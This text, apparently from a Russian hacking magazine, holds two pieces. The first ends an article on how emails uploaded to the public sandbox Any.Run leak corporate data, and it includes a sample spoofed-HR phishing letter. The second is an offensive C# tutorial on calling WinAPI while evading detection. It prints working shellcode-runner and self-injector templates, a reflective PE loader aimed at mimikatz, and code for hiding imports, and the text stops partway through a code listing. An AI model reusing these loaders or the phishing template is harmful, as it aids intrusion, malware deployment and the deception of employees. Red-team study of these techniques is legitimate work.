Вот текст вложения, содержащего название используемого сервиса и другие
полезные сведения:

      «Между ПАО xxxxxxx и ООО xxxxx действует договор подписки № ВК -
       xxxxxxxxx от 27.07.2020, который далее продлевался на основании«
       Дополнительного соглашения №2 от 31.03.2023.
       В рамках контроля обработки и обеспечения безопасности пер-
       сональных данных клиентов ПАО xxxxxxx прошу Вас предоставить сле-
     дующую информацию:
         Перечень всех аккаунтов, принадлежащих ПАО xxxxxxx;
          Логи подключений, иных действий (экспорт данных, импорт данных,
      изменения данных) субаккаунтов и основного аккаунта на платформе
       xxxxxx (НАЗВАНИЕ СЕРВИСА) для  сотрудников ПАО  xxxxxxx, обес-
      печить  их  дистрибуцию до  конечных  пользователей ПАО  xxxxxx,
      по факту исполнения сообщить об этом на адрес электронной почты
       xxxxxxxx.ru»                »
А вот другой интересный пример. Крупная нефтяная компания сотрудничает
с правительственным заказчиком из венгерского города Будапешта. На почту
сотрудника поступило письмо с официальным запросом о предоставлении
информации. Переводил письмо с  венгерского сторонний подрядчик —
бюро переводов. Поскольку отправителем является внешняя организация (те
самые переводчики), письмо было переслано безопаснику для проверки и в
результате попало к нам на стол. Сообщение я считаю подлинным, поскольку
в базе данных Any.Run оно носит пометку «без угроз». В самом тексте письма
мы видим фамилию и имя сотрудника, ответственного за связи с внешними
контрагентами, наименование переводческого бюро, а также контакты:


      «Для xxxxxxxxxxx Ирины.
          'xxxxxxxxx Ирина xxxxxxx' via Бюро переводов :«
       Елена, еще вариант перевод (PDF) направьте, пожалуйста, на почту
       xxxxxxxxx.ru
     С пометкой для меня.
       Спасибо!
       С уважением, xxxx Ирина
      Ведущий специалист службы по работе с внешними контрагентами
     АО "xxxнефть – Автоматизация и Метрология"
     МАТС: (xxxx) xxxx
       Тел.: (xxx) xxx-xx-xx
     С уважением, Елена xxxxxxxxxx
       Менеджер по работе с друзьями и партнерами»                »
А вот само вложение гораздо интереснее. Мало того что оно оформлено
на официальном бланке, оно содержит конфиденциальную информацию
о предоставляемых услугах, подробности о ввозе продукции, ее перечень.
Кроме того, на документе имеются печати переводчика и лингвистического
бюро, а также образцы подписей. Их довольно‑таки нетрудно подделать.





Информация о сервисах и площадках, которыми пользуется фирма, об орга‐
низациях, с которыми она сотрудничает, может пригодиться для более про‐
думанной атаки. В качестве наглядного примера использования сведений
о партнерах и контрагентах в ходе кибератак можно вспомнить нашумевший
случай, произошедший в 2013 году. Атака была направлена на компанию,
управляющую сетью  магазинов  розничной  торговли  Target  Corporation.
В результате фишинговой рассылки фирме‑подрядчику и одному из пос‐
тавщиков Fazio Mechanical были слиты данные о миллионах клиентов.
   Несмотря на меры против подобных утечек, принятые самой компанией,
киберпреступники смогли найти брешь у поставщика. Убытки, как финан‐
совые, так и репутационные, оказались весьма существенными. Затраты
на  восстановление системы безопасности оцениваются в  круглую сум‐
му 200 миллионов долларов США, а судебные издержки составили 18,5 мил‐
лиона долларов. В общей сложности киберпреступники получили сведения
о кредитных и дебетовых картах примерно 40 миллионов клиентов, а также
личные данные около 70 миллионов покупателей, включая имена, адреса
и номера телефонов.


ДАННЫЕ О ВНУТРЕННИХ СЕРВИСАХ

Как говорят патологоанатомы, все самое интересное кроется внутри. Эту глу‐
бокомысленную сентенцию можно отнести и к электронным письмам, из тех‐
нических заголовков которых можно выудить массу полезной информации.
Представим себе такую ситуацию: в компанию пришло письмо из банка
и бдительный сотрудник службы безопасности решил на всякий случай про‐
верить его на Any.Run.





Письмо оказалось подлинным, только вот теперь любой желающий может
узнать не  только  email  этого  специалиста (адрес можно использовать
для целевого фишинга), но и список внутренних сервисов организации из его
заголовков:
 • api.*********.ru ;
 • apidev.*********.ru ;
 • apiws.*********.ru ;
 • apiwsdev.*********.ru ;
 • baas.*********.ru ;
 • sandbox.*********.ru ;
 • wsint.*********.ru ;
 • wsinttest.*********.ru .

Эти сведения пригодятся в процессе поиска уязвимостей и различных багов
в инфраструктуре компании. Если хорошенько покопаться в заголовках, мы
можем выяснить версию защитного ПО, которое злоумышленнику придется
обойти в процессе атаки:


X-KSMG-AntiVirus: Kaspersky Secure Mail Gateway, version 2.0.1.6960,
bases: 2023/10/03 04:05:00 #22028123

Также атакующий может узнать SMTP Relay, а по нему выйти на другие
домены и внутренние сервисы организации для расширения возможных век‐
торов атак, как технических, так и с помощью социальной инженерии:


Received: from relay7.*********.ru (a11-00210-bl.*********.ru [***.
**.108.2])


ИСПОЛЬЗОВАНИЕ СОБРАННОЙ ИНФОРМАЦИИ

Что могут извлечь пентестеры из подобных писем? Зная почтовый домен,
атакующий наверняка использует его для получения информации об орга‐
низации и ее сотрудниках. Для этого отлично подходит сервис hunter.io. Изна‐
чально этот ресурс задумывался для поиска полезных бизнесу контактов. Но у
злоумышленников другая цель: проверив домен, они получат список всех
зарегистрированных почтовых ящиков из открытых источников, а иногда
и должности (по платной подписке, в бесплатной версии стоит ограничение
в десять адресов).
   Например, зная домен организации, после его проверки на hunter.io мы
находим следующее мыло — e.smirnova@****.ru. Можно предположить,
что в организации есть некая сотрудница Елена (или Елизавета) Смирнова
(имя, конечно, взято с потолка). Опираясь на эти сведения, лезем в социаль‐
ные сети, например в LinkedIn, и пытаемся найти этого человека. Если поиск
оказался успешен, изучаем профиль и собираем данные о  сотруднике.
В дальнейшем эту информацию в связке с социальной инженерией можно
использовать для таргетированного теста на проникновение.
   Зная множество почтовых ящиков или имея список сотрудников по дол‐
жностям и отделам, нетрудно совершить подмену своего адреса, притворив‐
шись коллегой. Тут уже начинается фишинг: можно, например, разослать
примерно такое письмо:


       Дорогие коллеги,
         спешим сообщить радостную новость. В нашем коллективе попол-«
      нение!
       Госленко Рандом Гослингович был принят на работу в качестве спе-
       циалиста по фин. грамотности. Направляю вам ссылку на профиль
      нашего сотрудника, где содержатся его биографические данные.
         (здесь  ссылка  на  фишинговый  сайт  с  формой  ввода  данных
      для кражи логина и пароля)
          Пожалуйста, ознакомьтесь с информацией и позаботьтесь о бла-
       гополучной интеграции Рандома в коллектив.
       Всем салют,
       Ромашкина Маша Юзернеймовна,
       Менеджер HR
      8 800 555 35 35
       Ул. Пушкина‑Колотушкина 1, Москва ...                »
Письмо от сотрудника отдела персонала, да еще и полученное от отправите‐
ля с «правильным» адресом, вызовет гораздо меньше подозрений, чем обыч‐
ная фишинговая рассылка.


ВЫВОДЫ

Даже поверхностное исследование данных, опубликованных в онлайн‑песоч‐
ницах, показывает, что специалисты по кибербезопасности иногда могут
представлять не меньшую угрозу для организации, чем коварные хакеры.
Несоблюдение элементарных правил цифровой гигиены или недостаточная
осведомленность о мерах безопасности может привести к утечкам и компро‐
метации данных.
   Недостаточно банально проверить техническую информацию из подоз‐
рительного письма, например, чтобы обнаружить подмену отправителя, нуж‐
но внимательно следить за тем, что и куда ты загружаешь.
   Помимо Any.Run, существуют альтернативные платформы, а также плат‐
ные тарифы, на которых письма хотя бы не сливают в паблик. Если в фишин‐
говом письме содержится ссылка, ее можно проверить с помощью сервиса
Browserling, запускающего браузер в виртуальной машине на три минуты.
Платный тариф позволяет проводить локальное тестирование, снимает огра‐
ничения по времени и дает возможность использовать разные браузеры (в
бесплатной версии доступны только Edge и Chrome на Windows 10). Ана‐
логи —  облачные  платформы  для  кросс‑браузерного  тестирования
LambdaTest, а также платные Sauce Labs и BrowserStack.
   Ну и не забываем про виртуальные машины. Использование виртуалок —
распространенная практика безопасного анализа и тестирования вредонос‐
ных писем и файлов. Они позволяют изолировать потенциально вредоносные
программы от основной операционной системы. При использовании вир‐
туалок в первую очередь стоит позаботиться о надежной изоляции виртуаль‐
ной машины от основной сети, чтобы предотвратить возможную утечку вре‐
доносного ПО. Безусловно,  загрузка и  настройка того же  бесплатного
VirtualBox потребует времени и определенных усилий, но зато обезопасит
компанию от случайной утечки конфиденциальной информации в паблик.
   Напоследок хочу выразить искреннюю благодарность постоянному автору
«Хакера» Юрию Другачу за содействие в написании этой статьи.
КОДИНГ





Одним из немногих минусов C# считается
некоторая сложность при вызове методов
WinAPI. Многие возможности уже переко‐
чевали в сборки, но до сих пор приходится
часто сталкиваться с задачей вызова фун‐        MichelleVermishelle                                                                                       @Michaelzhm
кций  Win32  напрямую. В  таком  случае        michael.zhmailo@yandex.ru
используются PInvoke, DInvoke и их про‐
изводные.  В  этой  статье  я  покажу,
как работают эти методы, и мы научимся
вызывать функции WinAPI из управляемого
кода.


Разработчики инструментов из категории offensive постепенно отказываются
от  зубодробительных  «плюсов» и  геройского  ассемблера и  переходят
к более приятным, добрым, отзывчивым и миловидным языкам. Конечно,
опрометчиво называть C# легким. В нем есть и сложные концепции — поп‐
робуй человеку с улицы понятным языком объяснить отличия IEnumerable
от IEnumerator, IComparer от IComparable, рассказать о плюсах TPL и PLINQ,
растолковать рефлексию, а уж про маршалинг или внутреннее устройство JIT-
компилятора я даже не заикаюсь (впрочем, последний относится к плат‐
форме CLR).
  При разработке программ для Windows сложно не использовать WinAPI.
Конечно, многие методы уже успешно портированы в отдельные сборки .NET.
Например, вместо GetUserName() достаточно обращаться вот к такой фун‐
кции:


System.Security.Principal.WindowsIdentity.GetCurrent().Name

Впрочем, если ты захочешь копнуть чуть глубже, то придешь к выводу, что
намного лучше (и стабильнее) будет обращаться напрямую к методу WinAPI,
чем доверять свой код непонятным, давно не поддерживаемым опенсорсным
сборкам от симпатяги индуса с GitHub.
   Просто так WinAPI не вызвать. И приходится искать ухищрения, чтобы
научить управляемый код обращаться к нативным методам. Давай пос‐
мотрим, что это за методы.


PLATFORM INVOKE

Platform Invoke (он же Static Invoke) — единственный «легальный» вызов
методов WinAPI из C#. Он отлично описан в официальной документации
Microsoft.
   Использовать его просто — все завязано на директиве DllImport. Сна‐
чала в нашем коде на C# идет объявление целевой функции для вызова, ука‐
зание DLL, из которой эту функцию брать, а после можно смело обращаться
к ней из управляемого кода.
   Например, так может выглядеть стандартный шелл‑код‑раннер через
VirtualAlloc(), memcpy(), CreateThread() и WaitForSingleObject():


[DllImport("kernel32.dll")]
public static extern IntPtr VirtualAlloc(IntPtr lpAddress, int dwSize
, uint flAllocationType, uint flProtect);


[DllImport("kernel32.dll")]
public static extern IntPtr CreateThread(IntPtr lpThreadAttributes,
uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint
dwCreationFlags, out uint lpThreadId);


[DllImport("kernel32.dll")]
public static extern UInt32 WaitForSingleObject(IntPtr hHandle,
UInt32 dwMilliseconds);


public static void StartShellcode(byte[] shellcode)
{
  uint threadId;


  IntPtr alloc = VirtualAlloc(IntPtr.Zero, shellcode.Length, (uint)(
AllocationType.Commit | AllocationType.Reserve), (uint)
MemoryProtection.ExecuteReadWrite);
  if (alloc == IntPtr.Zero) {
    return;
  }


  Marshal.Copy(shellcode, 0, alloc, shellcode.Length);
  IntPtr threadHandle = CreateThread(IntPtr.Zero, 0, alloc, IntPtr.
Zero, 0, out threadId);
  WaitForSingleObject(threadHandle, 0xFFFFFFFF);
}

В данном случае создаются полноценные прототипы используемых нативных
функций. Отдельно обращу внимание на указание целевой библиотеки,
из которой они вызываются. Такой механизм очень похож на вызов этих же
самых функций из кода на C++.
  При таком способе вызова описанные разработчиком функции добав‐
ляются в специальный раздел импорта, который потом резолвится, и появ‐
ляются адреса, по которым передается поток управления для вызова метода.
  Не стоит путать этот раздел со стандартным разделом импортов. Натив‐
ные функции, объявленные через Platform Invoke, оказываются в таблице
ImplMap, в разделе с метаданными CLR-сборки. Этот самый раздел авто‐
матически добавляется в PE-файл.





                     Как выглядит таблица ImplMap

К счастью, сигнатуры (это строка DllImport плюс прототип функции) самос‐
тоятельно писать не нужно. Достаточно заглянуть на один из сайтов с готовы‐
ми вариантами:
 • pinvoke.net — самый популярный вариант, который, увы, иногда не откры‐
   вается;
 • pinvoke.dev — тьфу‑тьфу, пока работает;
 • p-invoke.net — тоже выключился.

Как ты видишь, в наше суровое время полагаться только на веб‑страницы
может быть ошибочно, поэтому качай генератор P/Invoke-сигнатур, написан‐
ный в Microsoft. Он уж никуда не пропадет... скорее всего.
   Что ж, любая простота и абстракция при разработке инструментов атаки
работает как в плюс (упрощает жизнь редтимерам), так и в минус (усложняет
жизнь редтимерам). Ведь распарсить таблицу ImplMap и понять, какие
методы WinAPI используются, не составит труда. Это можно сделать даже
на PowerShell.


$assembly = "C:\File.exe"
$stream = [System.IO.File]::OpenRead($assembly)
$peReader = [System.Reflection.PortableExecutable.PEReader]::new(
$stream, [System.Reflection.PortableExecutable.PEStreamOptions]::
LeaveOpen -bor [System.Reflection.PortableExecutable.PEStreamOptions
]::PrefetchMetadata)
$metadataReader = [System.Reflection.Metadata.PEReaderExtensions]::
GetMetadataReader($peReader)
$assemblyDefinition = $metadataReader.GetAssemblyDefinition()
foreach($typeHandler in $metadataReader.TypeDefinitions) {
  $typeDef = $metadataReader.GetTypeDefinition($typeHandler)
  foreach($methodHandler in $typeDef.GetMethods()) {
    $methodDef = $metadataReader.GetMethodDefinition($methodHandler)
    $import = $methodDef.GetImport()
    if ($import.Module.IsNil) {
      continue
    }
    $dllImportFuncName = $metadataReader.GetString($import.Name)
    $dllImportParameters = $import.Attributes.ToString()
    $dllImportPath = $metadataReader.GetString($metadataReader.
GetModuleReference($import.Module).Name)
    Write-Host "$dllImportPath, $dllImportParameters`n
$dllImportFuncName`n"
  }
}





                            Пример вывода

Импорты можно  глянуть и через более специализированное ПО, такое
как monodis или известный многим dnSpy.
   Поэтому люди стали придумывать иные методы вызова неуправляемого
кода из C#, чтобы как минимум скрыть импорты.


DYNAMIC INVOKE

Этот механизм использует делегаты, чтобы получить  доступ к методам
из неуправляемого кода. Делегат, если упростить, можно считать указателем
на функцию. В C# не как в C++ — здесь имя функции не равно адресу фун‐
кции. Чтобы, например, передать функцию как колбэк, потребуется исполь‐
зовать делегат. Ниже пример простейшего делегата.


using System;
using System.Diagnostics;
using System.Runtime.InteropServices;


namespace Template
{
  public delegate int Operation(int x, int y);


  class Program
  {
    static void Main()
    {
      var a = 2;
      var b = 3;
      Operation op = Add;
      Console.WriteLine(op(a, b)); // Вызывается Add => 5
      op = Multiply;
      Console.WriteLine(op(a, b)); // Вызывается Multiply => 6
    }


    static int Add(int x, int y) => x + y;
    static int Multiply(int x, int y) => x * y;
  }
}

Как видишь, идет объявление делегата: возвращаемое значение, принима‐
емые  аргументы, все‑все данные. Затем можно инициализировать этот
делегат конкретным методом и, обратившись к делегату, вызвать функцию.
   Так вот, Dynamic Invoke можно считать сишарпным GetModuleHandle()
и GetProcAddress(). Этот механизм позволяет получить базовый адрес биб‐
лиотеки, пробежаться по экспортам, обнаружить адрес необходимой фун‐
кции  и  инициализировать  этим  адресом  конкретный  делегат  через
GetDelegateForFunctionPointer(). Как следствие, в таблице импортов
скомпилированной .NET-сборки не будет никаких подозрительных записей (в
отличие от того, как было при P/Invoke).
   Самый известный PoC — творение TheWover. В нем есть несколько
основных методов:
 • GetLibraryAddress() — эта функция сначала проверяет, не загружена
   ли уже целевая библиотека (метод из которой мы хотим вызвать) в память.
  Для этого она вызывает функцию GetLoadedModuleAddress() . Если
   либа не загружена, то загружается с помощью LoadModuleFromDisk() .
   Если загружена — дергается функция GetExportAddress() для поиска
   адреса функции в модуле;
 • GetLoadedModuleAddress()   —      использует     Process.
  GetCurrentProcess().Modules, чтобы определить, загружена ли уже
   библиотека в процесс;
 • LoadModuleFromDisk() — загружает DLL в память процесса с помощью
  LdrLoadDll() ;
 • GetExportAddress() — парсит таблицу экспортов конкретного модуля,
   отталкиваясь от его базового адреса, с целью найти функции. Функция
  может идентифицироваться по строковому имени или хешу (механизм API
   Hashing);
 • GetPebLdrModuleEntry() — обнаруживает базовый адрес загрузки
   модуля, анализируя PEB;
 • GetSyscallStub() — эта функция используется для маппинга в память
   процесса модуля ntdll.dll, причем с извлечением конкретной функции.
   Служит для исполнения прямых сисколов.

Проект также предоставляет несколько методов, которые позволяют заг‐
ружать библиотеку не с диска, а из памяти:
 • MapModuleToMemory() — механизм Memory Module. Реализует ручной
   маппинг байтов библиотеки в динамически выделенную память. Может
   принимать либо массив байтов, либо имя файла на диске;
 • MapModuleToMemoryAddress() — позволяет вручную маппить модуль,
   который уже находится в памяти (массив байтов) по определенному адре‐
   су;
 • OverloadModule() — использует Module Overloading для отображения
   модуля в память на место, где смаплена другая либа. Перезаписывается
   случайная DLL, которая лежит в C:\Windows\System32 и имеет циф‐
   ровую подпись. Этот метод может принимать либо массив байтов, либо
  имя файла на диске.

Вот отличный пример, где используются некоторые из этих методов.


using System;


namespace SpTestcase
{
  class Program
  {


    static void Main(string[] args)
    {
      String testDetail = @"
      #=================>
      # Hello there!
      # I find things dynamically; base
      # addresses and function pointers.
      #=================>
      ";
      Console.WriteLine(testDetail);


      Console.WriteLine("[?] Resolve Ntdll base from the PEB..");
      IntPtr hNtdll = SharpSploit.Execution.DynamicInvoke.Generic.
GetPebLdrModuleEntry("ntdll.dll");
      Console.WriteLine("[>] Ntdll base address : " + string.Format(
"{0:X}", hNtdll.ToInt64()) + "\n");


      Console.WriteLine("[?] Specifying the name of a DLL ("ntdll.dll
"), resolve a function by walking the export table in-memory..");
      Console.WriteLine("[+] Search by name --> NtCommitComplete");
      IntPtr pNtCommitComplete = SharpSploit.Execution.DynamicInvoke.
Generic.GetLibraryAddress("ntdll.dll", "NtCommitComplete", true);
      Console.WriteLine("[>] pNtCommitComplete : " + string.Format("{
0:X}", pNtCommitComplete.ToInt64()) + "\n");


      Console.WriteLine("[+] Search by ordinal --> 0x260 (
NtSetSystemTime)");
      IntPtr pNtSetSystemTime = SharpSploit.Execution.DynamicInvoke.
Generic.GetLibraryAddress("ntdll.dll", 0x260, true);
      Console.WriteLine("[>] pNtSetSystemTime : " + string.Format("{
0:X}", pNtSetSystemTime.ToInt64()) + "\n");


      Console.WriteLine("[+] Search by keyed hash -->
138F2374EC295F225BD918F7D8058316 (RtlAdjustPrivilege)");
      Console.WriteLine("[>] Hash : HMACMD5(Key).ComputeHash(
FunctionName)");
      String fHash = SharpSploit.Execution.DynamicInvoke.Generic.
GetAPIHash("RtlAdjustPrivilege", 0xaabb1122);
      IntPtr pRtlAdjustPrivilege = SharpSploit.Execution.
DynamicInvoke.Generic.GetLibraryAddress("ntdll.dll", fHash,
0xaabb1122);
      Console.WriteLine("[>] pRtlAdjustPrivilege : " + string.Format(
"{0:X}", pRtlAdjustPrivilege.ToInt64()) + "\n");


      Console.WriteLine("[?] Specifying the base address of DLL in
memory ({0:X}), resolve function by walking its export table...",
hNtdll.ToInt64());
      Console.WriteLine("[+] Search by name --> NtCommitComplete");
      IntPtr pNtCommitComplete2 = SharpSploit.Execution.DynamicInvoke
.Generic.GetExportAddress(hNtdll, "NtCommitComplete");
      Console.WriteLine("[>] pNtCommitComplete : " + string.Format("{
0:X}", pNtCommitComplete2.ToInt64()) + "\n");


      Console.WriteLine("[*] Pausing execution..");
      Console.ReadLine();
    }
  }
}

Проект обрел широкую популярность и используется во многих инструментах:
обход AMSI, запись в реестр, какое‑то совместное чудо bohops и snovvcrash.
  В конце концов, этот проект можно использовать и как Reflective PE
Loader. Вот код для запуска РЕ из памяти.


using System;
using System.IO;
using System.IO.Compression;


namespace DInvokePE
{
  public class Program
  {
    static byte[] Compress(byte[] data)
    {
      var output = new MemoryStream();
      using (var dStream = new DeflateStream(output, CompressionLevel
.Optimal))
        dStream.Write(data, 0, data.Length);


      return output.ToArray();
    }


    static byte[] Decompress(byte[] data)
    {
      var input = new MemoryStream(data);
      var output = new MemoryStream();
      using (var dStream = new DeflateStream(input, CompressionMode.
Decompress))
        dStream.CopyTo(output);


      return output.ToArray();
    }


    public static void Main(string[] args)
    {
      /*
      var rawBytes = File.ReadAllBytes(@"C:\Users\snovvcrash\Desktop\
mimikatz.exe");
      var compressed = Compress(rawBytes);
      var compressedB64 = Convert.ToBase64String(compressed);
      Console.WriteLine(compressedB64);
      */


      var compressed = Convert.FromBase64String("");
      var rawBytes = Decompress(compressed);
      var map = DInvoke.ManualMap.Map.MapModuleToMemory(rawBytes);
      DInvoke.DynamicInvoke.Generic.CallMappedPEModule(map.PEINFO,
map.ModuleBase);
      Console.ReadLine();
    }
  }
}

Помимо этих инструментов, для автоматического добавления исходного кода
в проект есть CsWhispers. Этот новый исходник позволит делать вызовы
DInvoke и использовать Indirect-сисколы.
   Впрочем,  необязательно  тащить  с собой огромную  либу.  Парсить
ExportTable можно и встроенными средствами C#. Этот код был приведен
исследователем xpn:


using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
namespace DynamicAPIInvoke
{
  /// <summary>
  /// "A Quick History Lesson"
  /// https://blog.xpnsec.com/weird-ways-to-execute-dotnet/
  /// </summary>
  public class Program
  {
    [UnmanagedFunctionPointer(CallingConvention.Winapi)]
    delegate IntPtr VirtualAllocDelegate(IntPtr lpAddress, uint
dwSize, uint flAllocationType, uint flProtect);
    [UnmanagedFunctionPointer(CallingConvention.Winapi)]
    delegate IntPtr ShellcodeDelegate();
    static IntPtr GetExportAddress(IntPtr baseAddr, string name)
    {
      var dosHeader = Marshal.PtrToStructure<IMAGE_DOS_HEADER>(
baseAddr);
      var peHeader = Marshal.PtrToStructure<IMAGE_OPTIONAL_HEADER64>(
baseAddr + dosHeader.e_lfanew + 4 + Marshal.SizeOf<IMAGE_FILE_HEADER
>());
      var exportHeader = Marshal.PtrToStructure<
IMAGE_EXPORT_DIRECTORY>(baseAddr + (int)peHeader.ExportTable.
VirtualAddress);
      for (int i = 0; i < exportHeader.NumberOfNames; i++)
      {
        var nameAddr = Marshal.ReadInt32(baseAddr + (int)exportHeader
.AddressOfNames + (i * 4));
        var m = Marshal.PtrToStringAnsi(baseAddr + (int)nameAddr);
        if (m == "VirtualAlloc")
        {
          var exportAddr = Marshal.ReadInt32(baseAddr + (int)
exportHeader.AddressOfFunctions + (i * 4));
          return baseAddr + (int)exportAddr;
        }
      }
      return IntPtr.Zero;
    }
    public static void Main()
    {
      // msfvenom -p windows/x64/messagebox TITLE='MSF' TEXT='Hack
the Planet!' EXITFUNC=thread -f csharp
      byte[] shellcode = new byte[] { };
      // Ищем экспорт-адрес из уже загруженной в память библиотеки
kernel32.dll
      IntPtr virtualAllocAddr = IntPtr.Zero;
      foreach (ProcessModule module in Process.GetCurrentProcess().
Modules)
        if (module.ModuleName.ToLower() == "kernel32.dll")
          virtualAllocAddr = GetExportAddress(module.BaseAddress,
"VirtualAlloc");
      // Инициализируем делегат найденным адресом
      var VirtualAlloc = Marshal.GetDelegateForFunctionPointer<
VirtualAllocDelegate>(virtualAllocAddr);
      // Выделяем область памяти shellcode.Length байт в адресном
пространстве текущего процесса инжектора (0x3000 = MEM_COMMIT |
MEM_RESERVE, 0x40 = PAGE_EXECUTE_READWRITE)
      var execMem = VirtualAlloc(IntPtr.Zero, (uint)shellcode.Length,
0x3000, 0x40);
      // Записываем шелл-код в выделенную область
      Marshal.Copy(shellcode, 0, execMem, shellcode.Length);
      // Обращаемся к шелл-коду как к функции и запускаем его без
создания нового потока
      var shellcodeCall = Marshal.GetDelegateForFunctionPointer<
ShellcodeDelegate>(execMem);
      shellcodeCall();
    }
    [StructLayout(LayoutKind.Sequential)]
    struct IMAGE_DOS_HEADER
    {
      // http://www.pinvoke.net/default.aspx/Structures/
IMAGE_DOS_HEADER.html
    }
    [StructLayout(LayoutKind.Sequential, Pack = 1)]
    struct IMAGE_OPTIONAL_HEADER64
    {
      // http://www.pinvoke.net/default.aspx/Structures/
IMAGE_OPTIONAL_HEADER64.html
    }
    [StructLayout(LayoutKind.Sequential)]
    struct IMAGE_DATA_DIRECTORY
    {
      // http://www.pinvoke.net/default.aspx/Structures/
IMAGE_DATA_DIRECTORY.html
    }
    [StructLayout(LayoutKind.Sequential)]
    struct IMAGE_FILE_HEADER
    {
      // http://www.pinvoke.net/default.aspx/Structures/
IMAGE_FILE_HEADER.html
    }
    [StructLayout(LayoutKind.Sequential)]
    struct IMAGE_EXPORT_DIRECTORY
    {
      // http://www.pinvoke.net/default.aspx/Structures/
IMAGE_EXPORT_DIRECTORY.html
    }
  }
}




                                     Продолжение статьи →
КОДИНГ              ← НАЧАЛО СТАТЬИ
        WINAPI            ДНЕМ
          И НОЧЬЮ
        ИЩЕМ СПОСОБЫ ОБРАЩЕНИЯ
               К НАТИВНОМУ КОДУ ИЗ C#





PARASITE INVOKE

«Лень — двигатель прогресса», — писал Андрей Вознесенский в стихот‐
ворении «Лень». Эта строка отлично описывает мое состояние недели пол‐
торы назад. Было желание творить, но не хотелось вновь поднимать заметки
по этим  бесконечным ABCD-Invoke,  параллельно вспоминая, как  адап‐
тировать конкретный метод под мой инструмент. Нужно было что‑то очень
простое, как PInvoke, но не менее скрытное (без записей в импорте), чем
DInvoke. Поэтому я создал еще один метод — Parasite Invoke.
  Я решил взглянуть на проблему с другой стороны:

    — Platform Invoke — механизм легитимный?
    — Конечно.«
    — Его другие разработчики используют?
    — Естественно!
    — А мы можем использовать их сигнатуры?
    — ...                »
Как ты понимаешь, был придуман метод, который может злоупотреблять
PInvoke-сигнатурами чужих сборок, прозрачно вызывая через них нужный
метод WinAPI. Рассмотрим механизм подробнее. При запуске PoC принимает
лишь обязательный параметр — path.


.\ParasiteInvoke.exe --path C:\ -r





        Пример вывода информации о сигнатурах сборок с диска С

Эта команда позволяет перечислить все PInvoke-методы в сборках, лежащих
на диске C. -r — рекурсивный перебор. Есть возможность поиска сигнатуры
и конкретного метода, например VirtualAlloc.


.\ParasiteInvoke.exe --path C:\ -r --method VirtualAlloc





         Обнаруженные сигнатуры VirtualAlloc в сборках на диске С

Теперь полученную сигнатуру можно вставить в нашу C#-программу, и метод
WinAPI будет успешно вызван через нее.


using System;
using System.Reflection;
using System.Runtime.InteropServices;


namespace Template
{
  class Program
  {
    static void Main()
    {
      Assembly asm = Assembly.LoadFrom(@"C:\Windows\Microsoft.NET\
Framework64\v4.0.30319\WPF\UIAutomationClientsideProviders.dll");
      Type t = asm.GetType("MS.Win32.UnsafeNativeMethods", true);
      var methodInfo = t.GetMethod("VirtualAlloc", System.Reflection.
BindingFlags.NonPublic | System.Reflection.BindingFlags.Static);
      IntPtr result = (System.IntPtr)methodInfo.Invoke(null, new
object[] { IntPtr.Zero, new UIntPtr(10), 0x3000, 0x40 } );
      Marshal.Copy(new byte[] { 1, 2, 3 }, 0, result, 3);
      Console.WriteLine(result);
      return;
    }


  }
}

Работает это следующим образом:
 1. В наше приложение загружается легитимная сборка, можно даже с циф‐
   ровой подписью.
 2. Происходит подготовка всех необходимых для получения метода данных.
  В частности, мы должны верно указать все флаги (какие модификаторы
   доступа у функции, статическая она или динамическая). Все сигнатуры
   PInvoke в 99% случаев располагаются в классах в виде  статических
   методов.
 3. Наконец,  подготовив  данные о  методе,  его  можно  вызвать  через
  methodInfo.Invoke() .

Это обеспечивает некоторое проксирование Platform Invoke, так как со сто‐
роны системы вызов метода WinAPI выполняется от лица легитимной сборки.
И вроде бы ничего страшного не происходит!


DYNAMIC PINVOKE

Что будет, если соединить Dynamic Invoke и Platform Invoke? Получится
Dynamic Platform Invoke! Представь, что ты можешь определять сигнатуру
PInvoke в рантайме. У нас есть возможность использовать разные динами‐
ческие типы и объекты .NET, чтобы определить необходимые методы и свой‐
ства для сигнатуры PInvoke во время выполнения, что позволит вызвать ее.
Метод основан на использовании DefinePInvokeMethod() для динамического
определения сигнатуры. Например, в эту функцию можно отдать прототип,
и она его без проблем прожует.


[DllImport("kernel32.dll")]
private static extern IntPtr VirtualAlloc(
  IntPtr lpStartAddr,
  ulong size,
  uint flAllocationType,
  uint flProtect);

Получается, достаточно заранее подготовить все методы, которые должны
быть вызваны, динамически их определить, создать динамическую сборку
в дефолтном AppDomain, что и приведет к вызову неуправляемого кода.
   Предлагаю рассмотреть на примере. Пусть есть следующий код с PInvoke
(до боли знакомый нам шелл‑код-self-инжектор):


using System;
using System.Runtime.InteropServices;


namespace ShellcodeLoader
{
  class Program
  {
    static void Main(string[] args)
    {
      byte[] x64shellcode = new byte[294] {
      0xfc,0x48, ... };


      IntPtr funcAddr = VirtualAlloc(
         IntPtr.Zero,
         (ulong)x64shellcode.Length,
         (uint)StateEnum.MEM_COMMIT,
         (uint)Protection.PAGE_EXECUTE_READWRITE);
      Marshal.Copy(x64shellcode, 0, (IntPtr)(funcAddr), x64shellcode.
Length);


      IntPtr hThread = IntPtr.Zero;
      uint threadId = 0;
      IntPtr pinfo = IntPtr.Zero;


      hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);
      WaitForSingleObject(hThread, 0xFFFFFFFF);
      return;
    }


    #region pinvokes
    [DllImport("kernel32.dll")]
    private static extern IntPtr VirtualAlloc(
      IntPtr lpStartAddr,
      ulong size,
      uint flAllocationType,
      uint flProtect);


    [DllImport("kernel32.dll")]
    private static extern IntPtr CreateThread(
      uint lpThreadAttributes,
      uint dwStackSize,
      IntPtr lpStartAddress,
      IntPtr param,
      uint dwCreationFlags,
      ref uint lpThreadId);


    [DllImport("kernel32.dll")]
    private static extern uint WaitForSingleObject(
      IntPtr hHandle,
      uint dwMilliseconds);


    public enum StateEnum
    {
      MEM_COMMIT = 0x1000,
      MEM_RESERVE = 0x2000,
      MEM_FREE = 0x10000
    }


    public enum Protection
    {
      PAGE_READONLY = 0x02,
      PAGE_READWRITE = 0x04,
      PAGE_EXECUTE = 0x10,
      PAGE_EXECUTE_READ = 0x20,
      PAGE_EXECUTE_READWRITE = 0x40,
    }
    #endregion
  }
}

С динамическим PInvoke программа выглядела бы вот так:


//original runner by @Arno0x: https://github.com/Arno0x/
CSharpScripts/blob/master/shellcodeLauncher.cs


using System;
using System.Runtime.InteropServices;
using System.Reflection;
using System.Reflection.Emit;


namespace ShellcodeLoader
{
  class Program
  {
    static void Main(string[] args)
    {
